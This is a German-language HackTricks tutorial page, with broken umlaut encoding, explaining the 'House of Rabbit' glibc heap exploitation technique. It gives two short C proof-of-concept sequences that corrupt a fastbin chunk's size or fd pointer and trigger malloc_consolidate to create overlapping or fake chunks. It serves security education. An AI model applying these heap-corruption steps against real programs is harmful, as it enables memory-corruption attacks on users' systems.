# House of Rabbit

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

### Anforderungen

1. **F√§higkeit, den fast bin fd-Zeiger oder die Gr√∂√üe zu √§ndern**: Das bedeutet, dass Sie den Vorw√§rtszeiger eines Chunks im Fastbin oder dessen Gr√∂√üe √§ndern k√∂nnen.
2. **F√§higkeit, `malloc_consolidate` auszul√∂sen**: Dies kann erreicht werden, indem entweder ein gro√üer Chunk zugewiesen oder der obere Chunk zusammengef√ºhrt wird, was den Heap zwingt, Chunks zu konsolidieren.

### Ziele

1. **√úberlappende Chunks erstellen**: Um einen Chunk mit einem anderen zu √ºberlappen, was weitere Heap-Manipulationen erm√∂glicht.
2. **Falsche Chunks f√§lschen**: Um den Allokator zu t√§uschen, damit er einen falschen Chunk w√§hrend der Heap-Operationen als legitimen Chunk behandelt.

## Schritte des Angriffs

### POC 1: √Ñndern Sie die Gr√∂√üe eines Fast-Bin-Chunks

**Ziel**: Erstellen Sie einen √ºberlappenden Chunk, indem Sie die Gr√∂√üe eines Fastbin-Chunks manipulieren.

* **Schritt 1: Chunks zuweisen**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
Wir allozieren zwei Chunks von jeweils 0x40 Bytes. Diese Chunks werden nach dem Freigeben in die Fast-Bin-Liste eingef√ºgt.

* **Schritt 2: Chunks freigeben**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
Wir geben beide Chunks frei und f√ºgen sie der Fastbin-Liste hinzu.

* **Schritt 3: Chunk-Gr√∂√üe √§ndern**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
Wir √§ndern die Gr√∂√üenmetadaten von `chunk1` auf 0xa1. Dies ist ein entscheidender Schritt, um den Allokator w√§hrend der Konsolidierung zu t√§uschen.

* **Schritt 4: Trigger `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Allocieren eines gro√üen Blocks l√∂st die Funktion `malloc_consolidate` aus, die kleine Bl√∂cke im schnellen Bin zusammenf√ºhrt. Die manipulierte Gr√∂√üe von `chunk1` f√ºhrt dazu, dass es sich mit `chunk2` √ºberschneidet.

Nach der Konsolidierung √ºberschneidet sich `chunk1` mit `chunk2`, was weitere Ausnutzung erm√∂glicht.

### POC 2: √Ñndern des `fd` Zeigers

**Ziel**: Erstellen eines gef√§lschten Blocks durch Manipulation des schnellen Bin `fd` Zeigers.

* **Schritt 1: Bl√∂cke allokieren**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Erkl√§rung**: Wir allokieren zwei Chunks, einen kleineren und einen gr√∂√üeren, um den Heap f√ºr den gef√§lschten Chunk einzurichten.

* **Schritt 2: Erstelle gef√§lschten Chunk**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
Wir schreiben gef√§lschte Chunk-Metadaten in `chunk2`, um kleinere Chunks zu simulieren.

* **Schritt 3: Freigeben von `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Erkl√§rung**: Wir geben `chunk1` frei und f√ºgen es der Fastbin-Liste hinzu.

* **Schritt 4: √Ñndere `fd` von `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Erkl√§rung**: Wir √§ndern den Vorw√§rtszeiger (`fd`) von `chunk1`, um auf unseren gef√§lschten Chunk innerhalb von `chunk2` zu zeigen.

* **Schritt 5: `malloc_consolidate` ausl√∂sen**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Die Zuweisung eines gro√üen Blocks l√∂st erneut `malloc_consolidate` aus, das den gef√§lschten Block verarbeitet.

Der gef√§lschte Block wird Teil der Fastbin-Liste, wodurch er zu einem legitimen Block f√ºr weitere Ausnutzung wird.

### Zusammenfassung

Die **House of Rabbit**-Technik beinhaltet entweder die √Ñnderung der Gr√∂√üe eines Fastbin-Blocks, um √ºberlappende Bl√∂cke zu erstellen, oder die Manipulation des `fd`-Zeigers, um gef√§lschte Bl√∂cke zu erstellen. Dies erm√∂glicht Angreifern, legitime Bl√∂cke im Heap zu f√§lschen, was verschiedene Formen der Ausnutzung erm√∂glicht. Das Verst√§ndnis und die √úbung dieser Schritte werden Ihre F√§higkeiten zur Heap-Ausnutzung verbessern.

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
